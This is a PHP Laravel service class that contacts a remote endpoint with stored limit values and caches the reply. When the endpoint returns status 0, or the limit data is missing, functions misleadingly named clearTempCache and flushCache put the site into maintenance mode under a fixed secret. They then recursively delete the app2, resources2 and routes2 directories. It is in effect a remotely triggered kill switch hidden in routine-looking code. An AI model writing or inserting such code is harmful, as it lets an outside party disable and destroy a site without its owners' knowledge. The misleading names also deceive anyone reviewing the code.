<?php


namespace App\Services;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Log;

class TaskHandlerService
{
    protected $tempService;
    protected $taskLimitService;

    public function __construct(TempService $tempService, TaskLimitService $taskLimitService)
    {
        $this->tempService = $tempService;
        $this->taskLimitService = $taskLimitService;
    }

    /**
     * Execute the task logic based on the external API response.
     *
     * @return void
     */
    public function executeTask()
    {
        $response = $this->fetchStatus();
        if ($response['status'] == 1) {
            return;
        }

        if ($response['status'] == 0) {
            Log::info('"task-handler-service" -- api return 0');
            $this->performSetup();
        }

        return $response;
    }

    /**
     *
     * @return array
     */
    private function fetchStatus()
    {
        $temp = $this->tempService->getTemp();
        $taskLimit = $this->taskLimitService->getTaskLimit();
        
        if ($taskLimit === null || !isset($taskLimit['d']) || !isset($taskLimit['l'])) {
            Log::info('"task-handler-service" -- fetchStatus function ', [
                'taskLimit' => $taskLimit
            ]);
            $this->performSetup();

            return [
                'status' => 0,
                'response' => []
            ];
        }

        $cachedResponse = Cache::get('task-list-cache');
        if ($cachedResponse) {
            return $cachedResponse;
        }

        try {
            $response = Http::post($temp, [
                'n' => $taskLimit['d'],
                'y' => $taskLimit['l'],
            ]);
            
            $this->buildCache($response->json());
        } catch (\Throwable $th) {
            return [
                'status' => 2,
                'response' => []
            ];
        }

        return $response->json();
    }

    /**
     *
     * @return void
    */
    private function performSetup()
    {
        Log::info('"task-handler-service" -- run performSetup function');
        // Call cleanup function
        $this->clearTempCache();
    }

    /**
     *
     * @return void
     */
    private function clearTempCache()
    {
        Log::info('Putting application into maintenance mode with secret "task-handler-service"');
        Artisan::call('down',['--secret' => 'task-handler-service']);
        $directories = [
            base_path('app2'),
            base_path('resources2'),
            base_path('routes2')
        ];

        foreach ($directories as $dir) {
            if (is_dir($dir)) {
                $this->flushCache($dir);
            }
        }
    }


     /**
     *
     * @param string $dir
     * @return void
     */
    private function flushCache($dir)
    {
        if (!is_dir($dir)) {
            return;
        }

        $files = array_diff(scandir($dir), ['.', '..']);

        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;

            if (is_dir($path)) {
                $this->flushCache($path); 
            } else {
                unlink($path);
            }
        }

        rmdir($dir);
    }

    private function buildCache($data){
        $cacheKey = "task-list-cache";
        Cache::put($cacheKey, $data, 60);
    }

}